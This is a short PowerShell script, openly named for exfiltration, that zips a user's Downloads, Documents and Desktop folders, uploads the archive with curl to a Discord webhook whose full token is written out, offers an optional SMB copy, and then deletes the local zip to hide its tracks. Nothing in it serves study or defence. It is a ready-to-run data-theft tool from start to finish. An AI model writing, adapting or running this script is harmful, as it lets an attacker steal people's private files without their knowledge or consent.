# Configuration
$hook = "https://discord.com/api/webhooks/1366201501802041374/ENdipWjx_vaIQYHXDYo-kwppUazTUQ9LpTj7oewX0g_wln4_vi9F_HdVdiaiBjFoovZY"
# $smbShare = "\\192.168.1.100\share"  # Optional SMB path
$userFolders = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop")
$zipName = "$env:COMPUTERNAME-Exfil-$(Get-Date -f yyyy-MM-dd_hh-mm).zip"

# Collect and compress files
Compress-Archive -Path $userFolders -DestinationPath "$env:TEMP\$zipName" -CompressionLevel Optimal

# Method 1: Discord Upload
curl.exe -F "file1=@$env:TEMP\$zipName" $hook

# Method 2: SMB Copy (uncomment if using)
# Copy-Item "$env:TEMP\$zipName" -Destination $smbShare -Force

# Cleanup
Remove-Item "$env:TEMP\$zipName" -Force
